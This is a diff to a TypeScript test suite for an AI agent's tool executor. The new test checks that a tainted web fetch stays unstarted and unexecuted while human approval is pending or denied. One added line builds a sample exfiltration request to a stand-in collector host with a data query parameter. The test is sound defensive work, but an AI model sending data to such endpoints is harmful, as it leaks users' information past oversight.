@@ -15,6 +15,7 @@ import type {
 } from "@/core/types/tools";
 import { frameUntrusted } from "@/core/utils/untrusted-content";
 import { createEgressTaint, taintedEgressNeedsApproval } from "./egress-taint";
+import { ToolBatchLedger } from "./tool-batch-ledger";
 import { ToolExecutor } from "./tool-executor";
 import { createAgentRunMetrics } from "../metrics/agent-run-metrics";
 import { isRunParkRequested } from "../run/park-signal";
@@ -187,7 +188,11 @@ function webFetchCall(url: string): ToolCall {
   };
 }
 
-function harness(options: { readonly canPrompt: boolean; readonly approve: boolean }) {
+function harness(options: {
+  readonly canPrompt: boolean;
+  readonly approve: boolean;
+  readonly onApproval?: () => void;
+}) {
   const executed: string[] = [];
   const approvals: ApprovalRequest[] = [];
   const registry = {
@@ -221,6 +226,7 @@ function harness(options: { readonly canPrompt: boolean; readonly approve: boole
     requestApproval: (request: ApprovalRequest) =>
       Effect.sync(() => {
         approvals.push(request);
+        options.onApproval?.();
         return { approved: options.approve };
       }),
   } as unknown as PresentationService;
@@ -232,7 +238,7 @@ function harness(options: { readonly canPrompt: boolean; readonly approve: boole
     Layer.succeed(FileSystem.FileSystem, {} as FileSystem.FileSystem),
   );
 
-  const run = (context: ToolExecutionContext, call: ToolCall) =>
+  const run = (context: ToolExecutionContext, call: ToolCall, ledger?: ToolBatchLedger) =>
     Effect.runPromiseExit(
       ToolExecutor.executeToolCalls(
         [call],
@@ -252,6 +258,10 @@ function harness(options: { readonly canPrompt: boolean; readonly approve: boole
         "a",
         "c",
         "a",
+        undefined,
+        undefined,
+        undefined,
+        ledger,
       ).pipe(Effect.provide(layer)) as unknown as Effect.Effect<
         readonly { result: unknown; success: boolean }[],
         Error
@@ -294,6 +304,19 @@ describe("ToolExecutor taint gate", () => {
     if (Exit.isSuccess(exit)) {
       expect(exit.value[0]?.success).toBe(false);
     }
+  });
+
+  it("does not mark a network call started while taint approval is pending", async () => {
+    const call = webFetchCall("https://collector.example/?d=x");
+    const ledger = new ToolBatchLedger([call]);
+    const { run, approvals, executed } = harness({
+      canPrompt: true,
+      approve: false,
+      onApproval: () => expect(ledger.statusOf(call.id)).toBe("not-started"),
+    });
+    await run(baseContext(taintedRun()), call, ledger);
+    expect(approvals).toHaveLength(1);
+    expect(executed).toEqual([]);
   });
 
   it("runs the call once the person approves", async () => {
